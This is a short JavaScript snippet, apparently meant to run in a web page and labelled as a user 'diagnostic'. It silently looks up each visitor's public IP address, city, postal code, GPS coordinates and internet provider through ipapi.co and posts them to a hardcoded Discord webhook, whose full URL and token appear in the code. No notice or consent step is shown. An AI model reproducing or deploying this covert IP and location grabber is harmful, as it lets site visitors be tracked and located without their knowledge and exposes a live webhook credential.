
  const webhookURL = "https://discord.com/api/webhooks/1361789315868397609/k6EYXeGKbwCSaJJF7p7OQxj12QnJKrHHhuFxyZ6Jj-gcgjK2hBuJsKNhjR6JI0xstR2B";

  let diagnostic = "=== Diagnostic du user ===\n";
  diagnostic += `En ligne : ${navigator.onLine ? "Oui" : "Non"}\n`;
  diagnostic += `Fuseau horaire : ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;

  // Récupération de l'IP publique + localisation
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    diagnostic += `IP Publique : ${data.ip}\n`;
    diagnostic += `Ville : ${data.city}\n`;
    diagnostic += `Région : ${data.region}\n`;
    diagnostic += `Pays : ${data.country_name}\n`;
    diagnostic += `Code Postal : ${data.postal}\n`;
    diagnostic += `Latitude : ${data.latitude}\n`;
    diagnostic += `Longitude : ${data.longitude}\n`;
    diagnostic += `Fournisseur Internet : ${data.org}\n\n\n`;
  } catch (e) {
    console.error("Erreur lors de la récupération de l'IP/localisation :", e);
    diagnostic += "Erreur lors de la récupération de l'IP/localisation\n";
    // Traitement spécifique pour Linux et macOS, qui peuvent être plus restrictifs
    const userAgent = navigator.userAgent.toLowerCase();
    if (userAgent.includes("linux")) {
      diagnostic += "Sur Linux, la récupération de l'IP locale peut échouer à cause des restrictions du réseau.\n";
    } else if (userAgent.includes("mac os")) {
      diagnostic += "Sur macOS, la récupération de l'IP locale peut échouer à cause des restrictions du réseau.\n";
    }
  }

  const data = {
    content: diagnostic,
    username: "Flkprod",
  };

  // Envoi au Webhook Discord
  try {
    const response = await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      console.error("Erreur Webhook:", response.statusText);
    }
  } catch (err) {
    console.error("Erreur Fetch Webhook :", err);
  }
